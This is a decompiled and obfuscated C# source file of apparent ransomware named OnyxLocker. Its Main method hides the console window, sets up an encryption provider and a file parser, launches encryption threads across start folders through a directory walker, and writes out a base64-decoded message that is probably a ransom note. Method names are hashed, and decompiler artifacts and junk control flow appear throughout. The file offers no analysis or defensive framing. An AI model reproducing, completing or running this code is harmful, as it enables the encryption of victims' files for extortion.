using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using A;

namespace OnyxLocker;

internal class Program
{
	public class DummyParser : IFileParser
	{
		public void ParseFile(string filePath)
		{
			Thread.Sleep(1);
			Console.WriteLine(cffd0443b4551df482d235e66317d4cd4.ce57b55ca454aabe14bf635b4c85d996c(7618));
		}
	}

	private const int SW_HIDE = 0;

	private const int SW_SHOW = 5;

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	private static void Main(string[] args)
	{
		Thread.Sleep(1);
		c045c2a179e61e525284bef945deaa50d.c757cc4db113ae43c821f8f25a1fa333e(cb1d949e5d9fb9f6c88471164ee146553.c757cc4db113ae43c821f8f25a1fa333e(), 0);
		IEncryptionProvider encryptionProvider = cf4ff0e409e380df37e22fa861bbe8201.c757cc4db113ae43c821f8f25a1fa333e();
		IFileParser c78fbc2c7fc5ebac523de0e8e861a297e = c0102f7c9c6c09c6df3b9c3316b7d8170.c757cc4db113ae43c821f8f25a1fa333e(encryptionProvider);
		IFileChecker c693f8a9abae01f1a9da2d299614390e = ca193db140cef73e9cba183175989ecb8.c757cc4db113ae43c821f8f25a1fa333e();
		List<Thread> list = cc49ed154c0aacf380aa56e78f6965072.c757cc4db113ae43c821f8f25a1fa333e(c8a5978ec89eea6f20389d8299c7f564a.cf4569e22c0f85ceb4658e58f206e1595(c4c6b7492a587455ccc8b419f1759860b.c757cc4db113ae43c821f8f25a1fa333e()), c55bf1749d5aa7291105aa973aa3880c3.c757cc4db113ae43c821f8f25a1fa333e(c693f8a9abae01f1a9da2d299614390e, c78fbc2c7fc5ebac523de0e8e861a297e));
		list.ForEach(delegate(Thread encThread)
		{
			encThread.Start();
		});
		c1c587123982f78cf8bebeeb034ac1504.cf4569e22c0f85ceb4658e58f206e1595(encryptionProvider);
		byte[] bytes = Convert.FromBase64String(cffd0443b4551df482d235e66317d4cd4.ce57b55ca454aabe14bf635b4c85d996c(1246));
		c763692063a54dea4b684518cdd25885a.cf4569e22c0f85ceb4658e58f206e1595(c8a5a3c9fa12fe18bc8edb5c18e1d77aa.c757cc4db113ae43c821f8f25a1fa333e(Encoding.UTF8.GetString(bytes), cffd0443b4551df482d235e66317d4cd4.ce57b55ca454aabe14bf635b4c85d996c(7568), 23));
		list.ForEach(delegate(Thread encThread)
		{
			if (encThread != null)
			{
				while (true)
				{
					switch (3)
					{
					case 0:
						break;
					default:
						if (1 == 0)
						{
							/*OpCode not supported: LdMemberToken*/;
						}
						encThread.Join();
						return;
					}
				}
			}
		});
	}

	private static List<Thread> GetEncryptionThreads(List<string> startFolders, DirWalker directoryWalker)
	{
		_003C_003Ec__DisplayClass6_0 _003C_003Ec__DisplayClass6_ = ca209e06474d4da42bd45e5d3e9b1c281.c757cc4db113ae43c821f8f25a1fa333e();
		_003C_003Ec__DisplayClass6_.directoryWalker = directoryWalker;
		List<Thread> list = new List<Thread>();
		using List<string>.Enumerator enumerator = startFolders.GetEnumerator();
		while (enumerator.MoveNext())
		{
			_003C_003Ec__DisplayClass6_1 CS_0024_003C_003E8__locals0 = cdc71db961be7fd903e1953f4a12836f4.c757cc4db113ae43c821f8f25a1fa333e();
			CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals1 = _003C_003Ec__DisplayClass6_;
			CS_0024_003C_003E8__locals0.folder = enumerator.Current;
			list.Add(new Thread((ThreadStart)delegate
			{
				ce9d99999bd71c8910be3d89599fb0743.cf4569e22c0f85ceb4658e58f206e1595(CS_0024_003C_003E8__locals0.CS_0024_003C_003E8__locals1.directoryWalker, CS_0024_003C_003E8__locals0.folder);
			}));
		}
		while (true)
		{
			switch (4)
			{
			case 0:
				continue;
			}
			if (1 == 0)
			{
				/*OpCode not supported: LdMemberToken*/;
				return list;
			}
			return list;
		}
	}
}
